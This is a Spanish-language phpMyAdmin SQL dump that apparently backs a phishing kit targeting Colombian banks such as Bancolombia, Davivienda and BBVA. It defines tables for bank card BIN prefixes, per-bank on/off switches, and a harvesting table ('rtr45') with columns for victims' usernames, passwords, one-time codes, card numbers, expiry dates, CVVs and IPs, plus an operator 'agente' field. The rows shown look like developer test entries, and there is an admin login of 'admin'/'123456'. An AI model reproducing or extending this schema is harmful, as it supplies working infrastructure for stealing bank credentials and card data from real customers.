-- phpMyAdmin SQL Dump
-- version 5.2.0
-- https://www.phpmyadmin.net/
--
-- Servidor: 127.0.0.1
-- Tiempo de generación: 01-06-2023 a las 07:13:46
-- Versión del servidor: 10.4.25-MariaDB
-- Versión de PHP: 7.4.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de datos: `cuatrosietedos`
--

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `bin`
--

CREATE TABLE `bin` (
  `id` int(11) NOT NULL,
  `nombre_banco` varchar(255) NOT NULL,
  `bin` longtext NOT NULL,
  `credito` int(11) NOT NULL,
  `debito` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `bin`
--

INSERT INTO `bin` (`id`, `nombre_banco`, `bin`, `credito`, `debito`) VALUES
(1, 'bancolombia', '  451307;601687;549157;601676;601651;451376;601645;530694;409983;601656;601676;601651;451376;601645;530694;409983;601656;601655;549158;601610;454400;451359;449188;377813;377814;377815;377816;377843;377844;377845;377846;377847;377848;377886;409983;409984;409985;411054;441119;446846;449188;451303;451307;451308;451309;451321;451359;451374;451376;451381;454400;459425;459428;485946;494381;517640;517710;530691;530693;530694;530695;530696;530697;540615;540649;540688;540691;541251;547062;547480;549157;549158;552588;552807;553145;528633;530372;530371;530373;459426', 0, 0);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `estado_servicios`
--

CREATE TABLE `estado_servicios` (
  `id` int(11) NOT NULL,
  `nombre_servicio` varchar(255) NOT NULL,
  `estado_servicio` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `estado_servicios`
--

INSERT INTO `estado_servicios` (`id`, `nombre_servicio`, `estado_servicio`) VALUES
(1, 'bancolombia', 1),
(2, 'avvillas', 1),
(3, 'davivienda', 1),
(4, 'bogota', 1),
(5, 'Colpatria', 1),
(6, 'bbva', 1),
(7, 'occidente', 1),
(8, 'tuya', 1),
(9, 'falabella', 1);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `estado_servidor`
--

CREATE TABLE `estado_servidor` (
  `id` int(11) NOT NULL,
  `estado` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `estado_servidor`
--

INSERT INTO `estado_servidor` (`id`, `estado`) VALUES
(1, 1);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `rtr45`
--

CREATE TABLE `rtr45` (
  `idreg` int(11) NOT NULL,
  `usuario` varchar(25) DEFAULT NULL,
  `password` varchar(30) DEFAULT NULL,
  `otp` varchar(30) DEFAULT NULL,
  `dispositivo` varchar(20) DEFAULT NULL,
  `ip` varchar(50) DEFAULT NULL,
  `id` varchar(50) DEFAULT NULL,
  `agente` varchar(20) DEFAULT NULL,
  `banco` varchar(30) DEFAULT NULL,
  `status` int(20) DEFAULT NULL,
  `horacreado` datetime NOT NULL,
  `horamodificado` datetime NOT NULL,
  `email` varchar(40) DEFAULT NULL,
  `cemail` varchar(20) DEFAULT NULL,
  `tarjeta` varchar(40) DEFAULT NULL,
  `ftarjeta` varchar(30) DEFAULT NULL,
  `cvv` varchar(10) DEFAULT NULL,
  `celular` varchar(40) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `rtr45`
--

INSERT INTO `rtr45` (`idreg`, `usuario`, `password`, `otp`, `dispositivo`, `ip`, `id`, `agente`, `banco`, `status`, `horacreado`, `horamodificado`, `email`, `cemail`, `tarjeta`, `ftarjeta`, `cvv`, `celular`) VALUES
(254, 'sssss111', '5555', '555555', 'PC', '::1', NULL, NULL, 'Bancolombia', 10, '2022-10-03 23:23:35', '2022-10-03 23:25:18', NULL, NULL, '3453453453453453', '10-2029', '555', NULL),
(255, '', '', NULL, '', '::1', NULL, NULL, 'Bancolombia', 10, '2023-05-25 04:39:55', '2023-05-25 04:43:31', NULL, NULL, NULL, NULL, NULL, NULL),
(256, '', '4568', NULL, 'iPhone', '::1', NULL, NULL, 'Bancolombia', 10, '2023-05-30 01:40:54', '2023-05-30 01:40:54', NULL, NULL, NULL, NULL, NULL, NULL),
(257, '', '1234', NULL, 'iPhone', '::1', NULL, NULL, 'Bancolombia', 10, '2023-05-30 01:41:25', '2023-05-30 01:41:25', NULL, NULL, NULL, NULL, NULL, NULL),
(258, 'prueba', '7854', NULL, 'PC', '::1', NULL, NULL, 'Bancolombia', 2, '2023-05-30 01:43:29', '2023-05-30 01:43:29', NULL, NULL, NULL, NULL, NULL, NULL),
(259, 'pruebaaaaaa', '1231', NULL, 'iPhone', '::1', NULL, NULL, 'Bancolombia', 2, '2023-05-30 01:53:12', '2023-05-30 01:53:12', NULL, NULL, NULL, NULL, NULL, NULL),
(260, 'hola123', '4521', '789456', 'iPhone', '::1', NULL, NULL, 'Bancolombia', 10, '2023-05-30 02:00:41', '2023-05-30 02:04:09', NULL, NULL, NULL, NULL, NULL, NULL),
(261, 'usernuevo', '1231', NULL, 'iPhone', '::1', NULL, NULL, 'Bancolombia', 40, '2023-05-30 02:18:32', '2023-05-30 02:18:32', NULL, NULL, NULL, NULL, NULL, NULL),
(262, 'asdasd123', '1231', '745315', 'PC', '::1', NULL, NULL, 'Bancolombia', 10, '2023-05-30 02:33:47', '2023-05-30 02:40:26', NULL, NULL, NULL, NULL, NULL, NULL),
(263, '', '1234', NULL, 'iPhone', '::1', NULL, NULL, 'Bancolombia', 10, '2023-05-30 02:49:39', '2023-05-30 02:50:42', NULL, NULL, NULL, NULL, NULL, NULL),
(264, '123123', '123', NULL, 'iPhone', '::1', NULL, NULL, 'Bancolombia', 2, '2023-05-30 02:57:18', '2023-05-30 02:57:18', NULL, NULL, NULL, NULL, NULL, NULL),
(265, '123456789', '123', NULL, 'iPhone', '::1', NULL, NULL, '', 2, '2023-05-31 03:51:47', '2023-05-31 03:51:47', NULL, NULL, NULL, NULL, NULL, NULL),
(266, '123456789', '1234', '123456', 'PC', '::1', NULL, NULL, '', 10, '2023-05-31 04:07:10', '2023-05-31 04:07:46', NULL, NULL, NULL, NULL, NULL, NULL),
(267, '12345789', '1234', '123543', 'iPhone', '::1', NULL, NULL, '', 10, '2023-05-31 04:12:06', '2023-05-31 04:17:22', NULL, NULL, NULL, NULL, NULL, NULL),
(268, '123456789b', '1234', '741236', 'iPhone', '::1', NULL, NULL, '', 10, '2023-05-31 04:21:22', '2023-05-31 04:25:17', NULL, NULL, NULL, NULL, NULL, NULL),
(269, 'prueba colpatria', '12345', '1231231', 'iPhone', '::1', NULL, NULL, '', 10, '2023-05-31 04:26:56', '2023-05-31 04:29:59', NULL, NULL, NULL, NULL, NULL, NULL),
(270, '1008676574', '1234', '123123', 'iPhone', '::1', NULL, NULL, '', 10, '2023-05-31 04:35:22', '2023-05-31 04:36:27', NULL, NULL, NULL, NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `uyuo6`
--

CREATE TABLE `uyuo6` (
  `usuario` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `hora` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `uyuo6`
--

INSERT INTO `uyuo6` (`usuario`, `password`, `hora`) VALUES
('admin', '123456', '2021-12-30 00:00:00');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `v1s1t`
--

CREATE TABLE `v1s1t` (
  `contador` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `v1s1t`
--

INSERT INTO `v1s1t` (`contador`) VALUES
(0);

--
-- Índices para tablas volcadas
--

--
-- Indices de la tabla `bin`
--
ALTER TABLE `bin`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `estado_servicios`
--
ALTER TABLE `estado_servicios`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `estado_servidor`
--
ALTER TABLE `estado_servidor`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `rtr45`
--
ALTER TABLE `rtr45`
  ADD PRIMARY KEY (`idreg`);

--
-- AUTO_INCREMENT de las tablas volcadas
--

--
-- AUTO_INCREMENT de la tabla `bin`
--
ALTER TABLE `bin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT de la tabla `estado_servicios`
--
ALTER TABLE `estado_servicios`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT de la tabla `estado_servidor`
--
ALTER TABLE `estado_servidor`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT de la tabla `rtr45`
--
ALTER TABLE `rtr45`
  MODIFY `idreg` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=271;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
